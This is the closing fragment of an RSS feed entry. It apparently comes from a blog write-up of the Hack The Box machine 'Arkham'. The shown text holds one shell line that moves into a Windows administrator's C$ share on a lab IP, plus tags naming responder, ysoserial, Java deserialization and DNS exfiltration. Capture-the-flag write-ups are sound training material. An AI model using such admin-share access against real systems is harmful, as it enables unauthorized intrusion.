&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;10.10.10.130&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;$&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-18%2015.41.20.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/arkham/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/arkham/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>smbclient</category>
            
          
            
              <category>binwalk</category>
            
          
            
              <category>responder</category>
            
          
            
              <category>ysoserial</category>
            
          
            
              <category>DNS exfil</category>
            
          
            
              <category>java deserialization</category>
            
          
            
              <category>readpst</category>
            
          
            
              <category>mutt</category>
            
          
            
              <category>powershell</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>windows</category>
            
          
        
        
      </item>
      

    
  </channel>
</rss>